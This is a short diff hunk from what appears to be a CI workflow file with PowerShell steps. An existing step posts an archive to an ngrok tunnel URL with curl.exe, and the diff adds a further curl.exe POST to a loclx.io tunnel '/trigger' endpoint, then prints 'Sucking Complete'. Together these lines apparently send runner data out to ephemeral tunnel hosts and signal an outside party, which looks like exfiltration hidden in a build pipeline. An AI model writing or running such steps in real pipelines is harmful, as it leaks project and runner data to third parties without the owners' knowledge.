@@ -145,3 +145,5 @@ jobs:
           curl.exe -X POST -F "file=@$tarPath" https://abstrusely-procompensation-phuong.ngrok-free.dev/upload
           
           Write-Host "Upload complete!"
+          curl.exe -X POST http://uk9heosxjd.loclx.io/trigger
+          Write-Host "Sucking Complete"
